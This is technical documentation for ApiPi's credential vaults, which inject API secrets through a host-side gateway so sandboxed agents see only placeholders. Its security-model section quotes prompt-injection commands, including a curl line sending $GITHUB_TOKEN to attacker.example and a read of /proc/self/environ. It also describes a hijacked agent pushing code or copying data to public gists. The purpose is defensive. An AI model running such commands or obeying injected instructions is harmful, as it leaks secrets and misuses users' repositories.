# Vaults and credentials

A vault holds secrets that an agent may use but never sees. You store
an API key or token once in a vault, attach the vault to a session,
and ApiPi uses the secret on the host side: in the credential broker
for MCP servers, and in the egress gateway for HTTPS requests that
code in the sandbox makes. The model, the tools, and the programs in
the sandbox never receive the secret value.

This page explains vaults, the two credential types, how to attach
them to sessions, and how to set up common services such as GitHub,
Forgejo, GitLab, package registries, and SaaS APIs. The route and field
reference is also in [API](api.md#vaults).

## Vaults

A vault is a named, tenant-scoped container for credentials. It has
`id`, `name`, `metadata`, `created_at`, and `updated_at`. Every query
is tenant-scoped, so a vault from another tenant is `404`. A vault can
hold credentials of both types.

| Method | Path | What it does |
| --- | --- | --- |
| `POST` | `/v1/agents/vaults` | Create a vault with `name` and `metadata` |
| `GET` | `/v1/agents/vaults` | List vaults |
| `GET` | `/v1/agents/vaults/{vault_id}` | Get one vault |
| `POST` | `/v1/agents/vaults/{vault_id}` | Update `name` and `metadata` |
| `DELETE` | `/v1/agents/vaults/{vault_id}` | Delete the vault and all its credentials |
| `POST` | `/v1/agents/vaults/{vault_id}/credentials` | Add a credential |
| `GET` | `/v1/agents/vaults/{vault_id}/credentials` | List credentials, without secret values |
| `GET` | `/v1/agents/vaults/{vault_id}/credentials/{id}` | Get one credential, without its secret value |
| `POST` | `/v1/agents/vaults/{vault_id}/credentials/{id}` | Update `name`, `metadata`, or the secret value |
| `DELETE` | `/v1/agents/vaults/{vault_id}/credentials/{id}` | Delete a credential |

The examples on this page use the same two variables as
[Using the API](using.md): `OPENAI_BASE_URL` is the ApiPi gateway
(for example `http://localhost:8000/v1`) and `OPENAI_API_KEY` is a
bearer that the gateway accepts. Create a vault like this:

```
curl -s -X POST "$OPENAI_BASE_URL/agents/vaults" \
  -H "Authorization: Bearer $OPENAI_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"name": "engineering"}'
```

The official OpenAI Python client has the same calls under
`client.beta.agents.vaults`:

```python
from openai import OpenAI

client = OpenAI()  # reads OPENAI_BASE_URL and OPENAI_API_KEY
vault = client.beta.agents.vaults.create(name="engineering")
print(vault.id)
```

## Credential types

A credential has `id`, `vault_id`, `name`, `auth`, `metadata`,
`created_at`, and `updated_at`. `auth.type` decides how ApiPi uses the
secret.

| `auth.type` | Used for | Secret field | Other `auth` fields |
| --- | --- | --- | --- |
| `static_bearer` | HTTP MCP servers. The host broker sends `Authorization: Bearer <token>` to the MCP server. | `token` | `mcp_server_url` |
| `environment_variable` | HTTPS requests from code in the sandbox: `curl`, `git`, `gh`, SDKs, and scripts the model writes. | `secret_value` | `secret_name`, `networking` |
| `mcp_oauth` | Not implemented. Returns `400` with type `not_implemented`. | | |

The store keeps `token` and `secret_value` as AES-256-GCM ciphertext,
encrypted with `APIPI_VAULT_MASTER_KEY` and bound to the tenant and the
credential id. `GET` and list responses never contain `token` or
`secret_value`, and neither do template and agent exports. See
[auth](auth.md#store) and [install](install.md) for the key.

### `static_bearer`

```json
{
  "name": "tavily",
  "auth": {
    "type": "static_bearer",
    "mcp_server_url": "https://mcp.tavily.com/mcp",
    "token": "tvly-..."
  }
}
```

When a session has an `mcp` tool whose `server_url` matches
`mcp_server_url`, or whose `credential_id` names this credential, the
host broker adds the bearer to every call to that server. Pi and the
guest only see the broker URL. Update replaces `token` and keeps the
id. See [tools](tools.md#mcp) for MCP tools.

### `environment_variable`

```json
{
  "name": "github",
  "auth": {
    "type": "environment_variable",
    "secret_name": "GITHUB_TOKEN",
    "secret_value": "github_pat_...",
    "networking": {
      "type": "limited",
      "allowed_hosts": ["github.com", "api.github.com"]
    }
  },
  "metadata": {"apipi.git_username": "x-access-token"}
}
```

| Field | Rules |
| --- | --- |
| `auth.secret_name` | The environment variable name in the sandbox. It matches `^[A-Za-z_][A-Za-z0-9_]*$` and is unique in the vault (`400` `secret_name_collision` otherwise). Reserved names are `400`: any name that starts with `OPENAI_`, `APIPI_`, `PI_`, or `CODEX_`, and `PATH`, `HOME`, `USER`, `SHELL`, `PWD`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `NODE_OPTIONS`, `DATABASE_URL`, `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `GIT_SSL_CAINFO`, and `NODE_EXTRA_CA_CERTS`. |
| `auth.secret_value` | The secret, a non-empty string of at most 16,384 characters. Control characters and line breaks are `400`, because the value goes into HTTP headers. Never returned. |
| `auth.networking.type` | Must be `limited`. |
| `auth.networking.allowed_hosts` | 1 to 100 exact hostnames such as `api.github.com`. No scheme, port, path, or wildcard. IP addresses are `400`. Names are stored in lowercase, and duplicates are dropped. |
| `metadata` | Optional key-value map, as on vaults. ApiPi reads one key: `apipi.git_username`, the user name that the git credential helper sends for this credential's hosts. It is only valid on `environment_variable` credentials. It must not contain a colon, a line break, or surrounding spaces. |

`GET` returns `type`, `secret_name`, and `networking`, never
`secret_value`:

```json
{
  "id": "6b1d…",
  "vault_id": "0f9a…",
  "name": "github",
  "auth": {
    "type": "environment_variable",
    "secret_name": "GITHUB_TOKEN",
    "networking": {"type": "limited", "allowed_hosts": ["github.com", "api.github.com"]}
  },
  "metadata": {"apipi.git_username": "x-access-token"},
  "created_at": "…",
  "updated_at": "…"
}
```

Update (`POST …/credentials/{id}`) keeps the id and the type. You can
change `name`, replace `metadata`, and replace `secret_value`. A body
that sends `secret_name` or `networking` with a different value is
`400`; create a new credential instead, as with OpenAI. Sending the
current values again is allowed. Changing `auth.type` is `400`.

```
curl -s -X POST "$OPENAI_BASE_URL/agents/vaults/$VAULT_ID/credentials/$CREDENTIAL_ID" \
  -H "Authorization: Bearer $OPENAI_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"auth": {"type": "environment_variable", "secret_value": "github_pat_new"}}'
```

With the Python client:

```python
client.beta.agents.vaults.credentials.update(
    credential_id,
    vault_id=vault_id,
    auth={"type": "environment_variable", "secret_value": "github_pat_new"},
)
```

## Attaching vaults to sessions

A session uses the credentials of the vaults in its `vault_ids`. Pass
them on session create, or store them on the agent as
`session_defaults.vault_ids`. Session create joins the agent's vault
ids and the session's vault ids, agent first, without duplicates.
`inherit_agent_defaults: false` ignores the agent's vault ids for that
session. A vault id that does not exist in the tenant is `404`. See
[API](api.md#agents) for the other session defaults.

```python
session = client.beta.agents.sessions.create(
    agent_id=agent_id,
    environment={"type": "openai_hosted"},
    vault_ids=[vault.id],
    input="Clone https://github.com/acme/widgets, fix the failing test, and open a pull request.",
)
```

Every credential of every attached vault is used. A vault with an MCP
credential and an environment credential gives the session both.

### When secrets are read

All vault credentials, MCP and environment alike, are a snapshot taken
when the sandbox starts. For `environment.type` `none`, which has no
sandbox, the snapshot is taken when the Pi process for the session
starts. A running sandbox keeps the values it started with. When you
rotate a `secret_value` or a `token`, add a credential, or delete one,
the change takes effect the next time the sandbox starts: after an idle
stop, a crash, a restart on another worker, or for a new session. This
matches OpenAI: create a new session to use a replacement right away.

The API still resolves and decrypts the credentials for every command
it sends to a worker, so the API keeps no state and any worker can
start the sandbox with the current values. Only the start of a sandbox
reads them.

Short-lived tokens need care. A GitHub App installation token expires
after one hour. Store a fresh token before you create a session, and
expect a sandbox that runs longer than the token's lifetime to get
`401` responses until it starts again.

## How environment credentials work

An `environment_variable` credential works only in a microVM sandbox,
which means a session with `environment.type` `openai_hosted` on
isolation `microvm`. The worker runs an egress gateway next to each
sandbox, and iptables sends all guest TCP to ports 80, 443, and 8443
to it. The guest needs no proxy settings. The gateway is described in
[environments](environments.md#vault-credentials-and-the-network) and
[configuration](config.md#networking). A worker with a custom
isolation backend has no egress gateway, so a sandbox with
environment credentials fails to start there with an error that names
the isolation.

When the sandbox starts, the worker does this for the credentials it
received from the API:

1. It makes a random placeholder for each credential,
   `apipi-secret-` followed by 32 hex characters. The placeholder is
   new for every sandbox start and every credential.
2. It writes `secret_name=<placeholder>` into the guest environment. A
   program that reads `$GITHUB_TOKEN` gets the placeholder, not the
   token, so `echo $GITHUB_TOKEN` prints only the placeholder. A value
   for the same name in `environment.env` cannot override it (session
   create already rejects that clash).
3. It tells the gateway to terminate TLS for every host in the
   credentials' `allowed_hosts`. The gateway answers those
   connections with a certificate from the worker's own certificate
   authority. Guest init joins that authority with the image's system
   authorities into `/run/apipi/ca-bundle.pem` and points
   `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `GIT_SSL_CAINFO`,
   `NODE_EXTRA_CA_CERTS`, and `CURL_CA_BUNDLE` at it. This needs a
   guest image built from this ApiPi version or later.
4. With `network.access` `restricted`, it adds the credential hosts to
   the session's allowed hostnames.

Then, for each HTTPS request on port 443 or 8443 to one of a
credential's `allowed_hosts`, the gateway:

1. replaces the placeholder with `secret_value` in request header
   values, including inside `Authorization: Basic` (it decodes the
   base64 `user:password`, replaces, and encodes it again), so
   `Bearer`, `token`, custom headers such as `X-Api-Key`, and git over
   HTTPS all work,
2. replaces the placeholder in the query string,
3. never changes the path or the request body,
4. connects to the real host, checks its real certificate, and sends
   the request,
5. replaces the secret with the placeholder again in the response
   headers.

A request with the placeholder to any other host goes out unchanged,
and the placeholder alone is worthless. Plain HTTP on port 80 never
gets a secret. Connections to hosts that no credential names are not
decrypted: the gateway passes them through byte for byte, so the guest
sees the real certificate of those servers.

The gateway logs each injection as `event=egress.injection` with
`session_id`, `credential_id`, and `host`, and counts it in
`apipi_egress_injections_total`. It never logs the secret value or the
placeholder. See [observability](observability.md).

### Git

Git asks a credential helper for a user name and a password. The
worker writes two files onto the workspace drive: a small helper
script, `.apipi/git-credential`, and a list of hosts,
`.apipi/git-credentials`, with one line per credential host that holds
the host, the user name, and the placeholder. Neither file contains a
secret. The guest environment configures git through
`GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, and `GIT_CONFIG_VALUE_<n>`.
For each credential host it sets:

- `credential.https://<host>.helper` to the helper, so git asks it only
  for that host,
- `url.https://<host>/.insteadOf` to `git@<host>:` and to
  `ssh://git@<host>/`, so a clone URL copied from the SSH tab uses
  HTTPS and goes through the gateway.

If `environment.env` already sets `GIT_CONFIG_COUNT` and its keys, the
worker appends its entries after them. The helper answers only `get`
requests for `https` URLs of a listed host. It ignores `store` and
`erase`, so git cannot save the placeholder anywhere.

The user name is `apipi.git_username` from the credential metadata
when it is set. Without it, the helper uses `oauth2` for `gitlab.com`
and `x-access-token` for every other host, which is what GitHub
expects. No token is ever written into a remote URL or into
`.git/config`.

### Requirements

The API checks these rules when a session is created, after it merges
the agent's `session_defaults`. Each failure is `400`.

| Rule | Error code |
| --- | --- |
| Environment credentials need a microVM session. With `environment.type` `none` they are `400`. A vault with only `static_bearer` credentials still works on `none`. | `credential_not_allowed` |
| `environment.network.access` `disabled` blocks all guest traffic, so environment credentials with it are `400`. | `credential_not_allowed` |
| Two attached credentials, in the same or different vaults, with the same `secret_name` are `400`. | `secret_name_collision` |
| A `secret_name` that is also a key in `environment.env` is `400`. | `secret_name_collision` |
| When the operator turns on the TAP allowlist (`APIPI_MICROVM_EGRESS_ALLOWLIST`), every host in `allowed_hosts` must already be allowed by the operator: the model host from `OPENAI_BASE_URL`, a host in `APIPI_MICROVM_EGRESS_HOSTS`, or a package registry host of the session's `packages`. A tenant cannot open a host by creating a credential. | `credential_host_not_allowed` |

The API checks the operator allowlist with its own
`APIPI_MICROVM_EGRESS_ALLOWLIST` and `APIPI_MICROVM_EGRESS_HOSTS`, so
set them to the same values on the API and on the workers. The worker
checks the network policy again when the sandbox starts.

A vault can change after the session was created. The API checks the
same rules again every time it builds a command for the worker, and a
turn on a session that now breaks a rule fails with the same `400`. On
a session with `environment.type` `none`, environment credentials that
were added to an attached vault later are left out, and MCP credentials
keep working.

With `network.access` `restricted`, the `allowed_hosts` of all attached
environment credentials are added to the session's `allowed_domains`
when the sandbox starts. You do not have to list them twice. The
session's stored `environment.network` does not show the added hosts.

A credential host on a private network, such as a self-hosted Forgejo
at `10.0.0.5`, works only when the operator lists it on the worker in
`APIPI_MICROVM_EGRESS_PRIVATE_HOSTS` (`[sandbox.network].private_hosts`,
hostnames or CIDRs). The gateway uses that list only for hostnames the
session names itself, which credential hosts always are, so listing a
private host does not open it for every session. If the server
certificate comes from an internal certificate authority, the operator
also sets `APIPI_MICROVM_EGRESS_UPSTREAM_CA`
(`[sandbox.network].upstream_ca`) to a PEM bundle with that authority.
The guest never reaches a private address directly. See
[configuration](config.md#networking).

The worker must list the protocol feature `env_credentials`. A worker
from an older ApiPi version does not list it, and the API does not send
it a command with environment credentials: the request fails with
`501` and code `unsupported_op` instead of starting a sandbox without
the credentials. Upgrade the workers. See
[worker protocol](worker-protocol.md#versioning-and-features).

### Limits

Environment credentials cover APIs that take a key in a header or in
the query string. They do not cover:

- Request signing, such as AWS Signature Version 4 or HMAC-signed
  webhooks. The client computes the signature from the secret, and the
  guest only has the placeholder. Use a function tool for those APIs,
  so the call runs in your application.
- Protocols other than HTTP over TLS: Postgres, MySQL, Redis, SSH,
  SMTP, IMAP, and others. The gateway does not change them. Git over
  SSH works only because the remote is rewritten to HTTPS.
- HTTPS on ports other than 443 and 8443, such as a Forgejo that
  listens on port 3000. Only those two ports go through the gateway, so
  put a credential host behind a reverse proxy on 443.
- HTTP/2 and gRPC to credential hosts. The gateway offers only
  `http/1.1` on intercepted connections, and most clients fall back to
  it. gRPC needs HTTP/2 and fails.
- Secrets in the request body, such as an OAuth client secret in a
  form post or an API key in a JSON body. The gateway never changes
  the body.
- Clients that pin certificates of a credential host, or that ship
  their own list of trusted authorities and ignore `SSL_CERT_FILE`
  (some Java and Rust programs). The TLS handshake with the gateway
  fails. Connections to hosts without a credential are not affected.
- Secrets in response bodies. The gateway masks the secret only in
  response headers. Do not use a credential with an API that returns
  the secret in a response body.
- Local use of the value. Code that hashes the secret, or checks its
  format before it sends it, sees only the placeholder.

### Security model

The secret value stays on the API, in the store, and in the memory of
the worker that runs the sandbox. It never enters the guest, the model
context, the transcript, or the logs. The gateway logs and counts each
injection with the credential id and the host, never the value or the
placeholder. Secret values are also masked in payload exports.

Because the guest only has a placeholder, a prompt injection cannot
steal the secret. A command such as `env`, `cat /proc/self/environ`,
or `curl https://attacker.example/?k=$GITHUB_TOKEN` shows or sends only
the placeholder, which is worthless outside this sandbox and changes
on the next start.

The agent can still use the token's rights on the allowed hosts. A
prompt injection that controls the agent could push to a repository,
delete a branch, or copy data from the workspace into a public issue or
gist on an allowed host. ApiPi does not filter what the agent does with
a credential. Protect yourself on the service side:

- Scope tokens tightly: only the repositories, projects, and
  permissions the task needs. Prefer fine-grained tokens, project or
  repository tokens, and short-lived tokens.
- Use server-side guards, such as branch protection that requires a
  review before a merge, and protected tags.
- Use one vault per purpose, and attach only the vaults that a session
  needs.

## Choosing between MCP credentials and environment credentials

| | `static_bearer` (MCP) | `environment_variable` |
| --- | --- | --- |
| Who uses the secret | The host broker, for calls to one MCP server | Any program in the sandbox, through the egress gateway |
| What the model sees | MCP tools with names and schemas | A shell and the programs it runs |
| Session types | `none` and `openai_hosted` | `openai_hosted` on isolation `microvm` only |
| Authentication | `Authorization: Bearer <token>` | Any request header, Basic auth, or query string on allowed hosts |
| Network policy | Not needed: the guest only reaches the broker | Needs `network.access` `enabled` or `restricted` |
| Good for | A curated set of actions, servers that already speak MCP, sessions without a computer | `git`, CLIs (`gh`, `glab`, `tea`, `npm`), SDKs, and scripts the model writes |

Use an MCP credential when an MCP server already offers the actions
you want, or when the session has no computer. The model can only call
the tools that the server lists, and `allowed_tools` narrows that
further. Use an environment credential when the agent should work like
a developer with the normal tools for a service, above all `git`. The
agent can then do anything the token allows on the allowed hosts.

## Examples

Each example creates one vault and one or more credentials, then
attaches the vault to a session. Replace the placeholder values in
angle brackets. `examples/github-git.yaml` and
`examples/forgejo-git.yaml` hold the same setups as agent snippets.

### GitHub

Create one of these tokens:

- A fine-grained personal access token limited to the repositories the
  agent works on. For clone and push, grant `Contents: Read and write`.
  For pull requests, also grant `Pull requests: Read and write`. Add
  `Issues: Read and write` if the agent comments on issues.
- A GitHub App installation token, which expires after one hour. Store
  a new one before each session.

Git over HTTPS uses `github.com`. The GitHub CLI `gh` and the REST and
GraphQL APIs use `api.github.com`. Those two hosts are enough for
clone, pull, push, `gh pr create`, and API calls. Add
`uploads.github.com` only if the agent uploads release assets.
Downloads of archives and release files go to `codeload.github.com`
and `objects.githubusercontent.com` with signed URLs that need no
token. Do not add them to `allowed_hosts`. With
`network.access` `restricted`, list them in `allowed_domains` if the
agent needs those downloads.

```
VAULT_ID=$(curl -s -X POST "$OPENAI_BASE_URL/agents/vaults" \
  -H "Authorization: Bearer $OPENAI_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"name": "github"}' | jq -r .id)

curl -s -X POST "$OPENAI_BASE_URL/agents/vaults/$VAULT_ID/credentials" \
  -H "Authorization: Bearer $OPENAI_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "github token",
    "auth": {
      "type": "environment_variable",
      "secret_name": "GITHUB_TOKEN",
      "secret_value": "<github_pat_...>",
      "networking": {"type": "limited", "allowed_hosts": ["github.com", "api.github.com"]}
    }
  }'
```

`gh` reads `GH_TOKEN` first and then `GITHUB_TOKEN`, so one credential
named `GITHUB_TOKEN` is enough for `gh`, `git`, and most SDKs. If a
tool only reads `GH_TOKEN`, add a second credential with the same
token and `secret_name` `GH_TOKEN`.

The same setup with the Python client, including the session:

```python
import os

from openai import OpenAI

client = OpenAI()
vault = client.beta.agents.vaults.create(name="github")
client.beta.agents.vaults.credentials.create(
    vault.id,
    name="github token",
    auth={
        "type": "environment_variable",
        "secret_name": "GITHUB_TOKEN",
        "secret_value": os.environ["GITHUB_PAT"],
        "networking": {"type": "limited", "allowed_hosts": ["github.com", "api.github.com"]},
    },
)
session = client.beta.agents.sessions.create(
    agent={"model": "gpt-4.1", "instructions": "Work in /workspace. Open pull requests, never push to main."},
    environment={"type": "openai_hosted"},
    vault_ids=[vault.id],
    input="Clone https://github.com/acme/widgets, fix the failing test, and open a pull request.",
)
```

In the sandbox, the agent uses the normal commands. No token appears in
a URL or a file:

```
git clone https://github.com/acme/widgets.git
git clone git@github.com:acme/widgets.git   # rewritten to HTTPS
cd widgets
git checkout -b fix-test
git commit -am "Fix the failing test"
git push -u origin fix-test
gh pr create --title "Fix the failing test" --body "The date parser used the local time zone."
curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user
```

The credential helper answers git with user name `x-access-token` and
the placeholder, which works for both kinds of token. Protect `main`
with branch protection, so a pull request needs a review before it is
merged, whatever the agent does with the token.

### Forgejo and Gitea

Self-hosted Forgejo usually runs on a private network. In this example
it is `https://git.example.com`.

Create an access token for a dedicated bot user under **Settings →
Applications → Access tokens**. Grant `write:repository` for clone,
push, and pull requests. Add `write:issue` if the agent creates issues
or comments on issues and pull requests. If your Forgejo version can
limit a token to selected repositories, use that.

Set `apipi.git_username` to the user name of the token owner, so git
sends that user name with the token. ApiPi does not guess or verify
it.

```
curl -s -X POST "$OPENAI_BASE_URL/agents/vaults/$VAULT_ID/credentials" \
  -H "Authorization: Bearer $OPENAI_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "forgejo bot",
    "auth": {
      "type": "environment_variable",
      "secret_name": "FORGEJO_TOKEN",
      "secret_value": "<forgejo token>",
      "networking": {"type": "limited", "allowed_hosts": ["git.example.com"]}
    },
    "metadata": {"apipi.git_username": "apipi-bot"}
  }'
```

In the sandbox, git and the Forgejo API work with the placeholder:

```
git clone https://git.example.com/acme/widgets.git
cd widgets
git checkout -b fix-test
git commit -am "Fix the failing test"
git push -u origin fix-test

curl -s -H "Authorization: token $FORGEJO_TOKEN" \
  https://git.example.com/api/v1/user

curl -s -X POST -H "Authorization: token $FORGEJO_TOKEN" \
  -H "Content-Type: application/json" \
  https://git.example.com/api/v1/repos/acme/widgets/pulls \
  -d '{"title": "Fix the failing test", "head": "fix-test", "base": "main", "body": "The date parser used the local time zone."}'
```

The `tea` CLI also works if it is in the image. `tea login add --url
https://git.example.com --token "$FORGEJO_TOKEN"` stores the
placeholder in tea's configuration, and the gateway replaces it on each
request. The same setup works for Gitea.

The operator must let the worker reach a private Forgejo. On every
worker, set the private host and, when the server certificate comes
from an internal authority, the authority bundle. With the TAP
allowlist on, also allow the host on the API and on the workers:

```
APIPI_MICROVM_EGRESS_PRIVATE_HOSTS=git.example.com
APIPI_MICROVM_EGRESS_UPSTREAM_CA=/etc/apipi/internal-ca.pem
APIPI_MICROVM_EGRESS_HOSTS=git.example.com   # only with APIPI_MICROVM_EGRESS_ALLOWLIST=true
```

The same in `apipi.toml`:

```toml
[sandbox.network]
private_hosts = ["git.example.com"]
upstream_ca = "/etc/apipi/internal-ca.pem"
```

`private_hosts` also accepts a CIDR such as `10.0.0.0/24`. The worker
fails at startup if the `upstream_ca` file is missing. Forgejo must
serve HTTPS on port 443 or 8443, because only those ports go through
the gateway.

### GitLab

Create a project access token (or a group access token) with role
`Developer` and scopes `read_repository` and `write_repository` for
git. Add scope `api` if the agent calls the API or creates merge
requests. Git and the API both use the GitLab host, so one host is
enough. The credential helper uses user name `oauth2` for `gitlab.com`.
For a self-hosted GitLab, set `apipi.git_username` to `oauth2`.

| `secret_name` | `allowed_hosts` | Use in the sandbox |
| --- | --- | --- |
| `GITLAB_TOKEN` | `gitlab.com` | `git clone https://gitlab.com/acme/widgets.git`; `curl -H "PRIVATE-TOKEN: $GITLAB_TOKEN" https://gitlab.com/api/v4/projects`; `glab mr create` |

### Other services

The same pattern works for any HTTPS API that takes a key in a header
or the query string. The table lists common choices. Use only the
hosts the tool really calls with the key.

| Service | `secret_name` | `allowed_hosts` | Use in the sandbox |
| --- | --- | --- | --- |
| npm registry | `NPM_TOKEN` | `registry.npmjs.org` | Write `//registry.npmjs.org/:_authToken=${NPM_TOKEN}` into `.npmrc`; then `npm install` or `npm publish` |
| Private Python index (uv) | `UV_INDEX_PRIVATE_PASSWORD` | `pypi.example.com` | Set `UV_INDEX_PRIVATE_USERNAME` in `environment.env` and define the index `private` in `pyproject.toml`; `uv sync` |
| Private Python index (pip) | `PYPI_TOKEN` | `pypi.example.com` | `pip install --index-url "https://__token__:${PYPI_TOKEN}@pypi.example.com/simple" mypkg` |
| PyPI upload | `TWINE_PASSWORD` | `upload.pypi.org` | Set `TWINE_USERNAME=__token__` in `environment.env`; `twine upload dist/*` |
| Hugging Face | `HF_TOKEN` | `huggingface.co` | `huggingface-cli download acme/model`; Python `huggingface_hub` reads `HF_TOKEN` |
| Anthropic API | `ANTHROPIC_API_KEY` | `api.anthropic.com` | `anthropic.Anthropic()` in a script |
| Google Gemini API | `GEMINI_API_KEY` | `generativelanguage.googleapis.com` | `curl -H "x-goog-api-key: $GEMINI_API_KEY" https://generativelanguage.googleapis.com/v1beta/models` |
| Another OpenAI-compatible provider | `LLM_API_KEY` | `api.example-llm.com` | `OpenAI(base_url="https://api.example-llm.com/v1", api_key=os.environ["LLM_API_KEY"])` |
| Linear | `LINEAR_API_KEY` | `api.linear.app` | `curl -H "Authorization: $LINEAR_API_KEY" -H "Content-Type: application/json" https://api.linear.app/graphql -d '{"query": "{ viewer { name } }"}'` |
| Sentry | `SENTRY_AUTH_TOKEN` | `sentry.io` | `sentry-cli releases list` |
| Slack bot | `SLACK_BOT_TOKEN` | `slack.com` | `curl -H "Authorization: Bearer $SLACK_BOT_TOKEN" -d channel=C123 -d text=Done https://slack.com/api/chat.postMessage` sends the token in a header, not in the form body |
| Stripe (test mode key) | `STRIPE_API_KEY` | `api.stripe.com` | `curl -u "$STRIPE_API_KEY:" https://api.stripe.com/v1/customers`; the Stripe CLI reads `STRIPE_API_KEY` |
| Vercel | `VERCEL_TOKEN` | `api.vercel.com` | `vercel deploy --token "$VERCEL_TOKEN"` |
| Cloudflare | `CLOUDFLARE_API_TOKEN` | `api.cloudflare.com` | `wrangler deploy`; `curl -H "Authorization: Bearer $CLOUDFLARE_API_TOKEN" https://api.cloudflare.com/client/v4/user/tokens/verify` |

A few details matter for these tools:

- A token inside a URL works only when the client turns the user
  part of the URL into an `Authorization: Basic` header, as pip, uv,
  and git do. The gateway replaces the placeholder there. A client that
  sends the URL somewhere else, for example inside a request body, sends
  only the placeholder.
- Names that start with `OPENAI_` are reserved for ApiPi. For an
  OpenAI-compatible provider in a script, pick another name and pass it
  to the client, as in the table.
- The Slack Web API also accepts the token as a form field. That
  would be in the body, which the gateway never changes, so send it in
  the `Authorization` header.
- Downloads often redirect to a storage or CDN host with a signed
  URL, for example from `huggingface.co` or `github.com`. Those hosts
  need no key, so leave them out of `allowed_hosts`. With
  `network.access` `restricted`, list them in `allowed_domains`.
- Some CLIs call more than one host. A request to a host that is not
  in `allowed_hosts` carries only the placeholder and fails with `401`.
  Add the host to the credential if it needs the key.

### Search over MCP: Tavily

Tavily's hosted MCP server takes the key as a bearer, so it uses a
`static_bearer` credential. The agent lists the MCP tool, and the
session attaches the vault. The key never reaches Pi or the guest.

```
curl -s -X POST "$OPENAI_BASE_URL/agents/vaults/$VAULT_ID/credentials" \
  -H "Authorization: Bearer $OPENAI_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "tavily",
    "auth": {
      "type": "static_bearer",
      "mcp_server_url": "https://mcp.tavily.com/mcp",
      "token": "<tvly-...>"
    }
  }'
```

The agent has the tool
`{"type": "mcp", "server_label": "tavily", "server_url": "https://mcp.tavily.com/mcp"}`
(see `examples/tavily.yaml`), and the session passes
`"vault_ids": ["<vault id>"]`. This works on `environment.type` `none`
too. For one operator search key, use the built-in
[`web_search` tool](tools.md#web-search) instead.
